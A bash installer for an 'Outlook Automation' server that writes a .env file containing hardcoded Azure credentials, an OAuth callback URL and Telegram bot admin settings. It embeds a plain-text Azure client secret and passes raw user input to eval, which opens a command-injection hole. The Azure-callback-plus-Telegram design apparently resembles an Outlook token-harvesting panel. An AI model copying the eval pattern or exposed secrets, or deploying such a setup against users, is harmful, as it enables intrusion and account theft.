#!/bin/bash

# Outlook Automation VPS Installation Script
echo "🚀 Outlook Automation VPS Installation Script"
echo "=============================================="
echo "This script will configure your VPS for production deployment"
echo ""

# Check system requirements first
check_requirements() {
    echo "🔍 Checking system requirements..."

    # Check Node.js
    if ! command -v node &> /dev/null; then
        echo "❌ Node.js not found. Please install Node.js first."
        exit 1
    fi

    # Check npm
    if ! command -v npm &> /dev/null; then
        echo "❌ npm not found. Please install npm first."
        exit 1
    fi

    echo "✅ System requirements met"
}

# Optimized input function with validation
get_input() {
    local prompt="$1"
    local var_name="$2"
    local required="$3"
    local validate_func="$4"

    while true; do
        read -p "$prompt: " input

        if [ "$required" = "true" ] && [ -z "$input" ]; then
            echo "❌ This field is required."
            continue
        fi

        if [ -n "$validate_func" ] && ! $validate_func "$input"; then
            continue
        fi

        eval "$var_name='$input'"
        break
    done
}

# URL validation
validate_url() {
    if [[ ! "$1" =~ ^https?:// ]]; then
        echo "❌ URL must start with http:// or https://"
        return 1
    fi
    return 0
}

# Chat ID validation
validate_chat_id() {
    if [[ ! "$1" =~ ^[0-9]+$ ]]; then
        echo "❌ Chat ID must be numbers only (e.g., 123456789)"
        return 1
    fi
    return 0
}

# Fast dependency installation
install_deps() {
    echo "📦 Installing dependencies (optimized)..."
    npm ci --production --silent || npm install --production --silent
    echo "✅ Dependencies installed"
}

# Main installation
main() {
    check_requirements

    echo ""
    echo "📝 VPS Configuration Setup"
    echo "Please provide the following information for your VPS deployment:"
    echo ""

    # Pre-configured Azure (as in original)
    AZURE_CLIENT_ID="34dc06b1-d91e-4408-b353-528722266c04"
    AZURE_CLIENT_SECRET="05a49988-1efb-4952-88cc-cb04e9f4c099"
    AZURE_TENANT_ID="29775c6a-2d6e-42ef-a6ea-3e0a46793619"
    echo "✅ Azure credentials pre-configured"
    echo ""

    # Server URL (Domain for Azure Redirect)
    echo "🌐 DOMAIN CONFIGURATION"
    echo "Enter your VPS domain/IP that users will access:"
    echo "Examples: https://outlook.mycompany.com, https://123.45.67.89, https://mydomain.com"
    get_input "Your VPS Domain/URL" "SERVER_URL" "true" "validate_url"
    SERVER_URL="${SERVER_URL%/}"
    AZURE_REDIRECT_URI="${SERVER_URL}/api/auth-callback"
    echo "✅ Azure redirect URI: $AZURE_REDIRECT_URI"
    echo ""

    # Telegram Bot Configuration
    echo "🤖 TELEGRAM BOT CONFIGURATION"
    echo "1. Create a bot with @BotFather on Telegram"
    echo "2. Copy the bot token (looks like: 123456789:ABCdef...)"
    get_input "Telegram Bot Token" "TELEGRAM_BOT_TOKEN" "true"
    echo ""
    
    echo "📱 ADMIN ACCESS CONFIGURATION"
    echo "1. Send /start to @userinfobot on Telegram to get your Chat ID"
    echo "2. Your Chat ID is a number (looks like: 123456789)"
    get_input "Your Telegram Chat ID (numbers only)" "ADMIN_CHAT_IDS" "true" "validate_chat_id"

    # Generate session secret efficiently
    SESSION_SECRET=$(openssl rand -base64 32 2>/dev/null || head -c 32 /dev/urandom | base64 | tr -d '\n')

    # Create .env file
    cat > .env << EOF
SESSION_SECRET="$SESSION_SECRET"
AZURE_CLIENT_ID="$AZURE_CLIENT_ID"
AZURE_CLIENT_SECRET="$AZURE_CLIENT_SECRET"
AZURE_TENANT_ID="$AZURE_TENANT_ID"
AZURE_REDIRECT_URI="$AZURE_REDIRECT_URI"
TELEGRAM_BOT_TOKEN="$TELEGRAM_BOT_TOKEN"
ADMIN_CHAT_IDS="$ADMIN_CHAT_IDS"
PORT=5000
NODE_ENV=production
EOF

    echo "✅ Configuration complete"

    # Fast dependency installation
    install_deps

    echo ""
    echo "🎉 VPS Installation Complete!"
    echo "================================================"
    echo "✅ Configuration saved to .env file"
    echo "✅ Dependencies installed"
    echo "✅ Azure redirect URI: $AZURE_REDIRECT_URI"
    echo "✅ Telegram bot configured"
    echo ""
    echo "🚀 To start the server: npm start"
    echo "🔧 Server will run on: $SERVER_URL"
    echo "🤖 Admin access via Telegram bot"
    echo "================================================"
}

main "$@"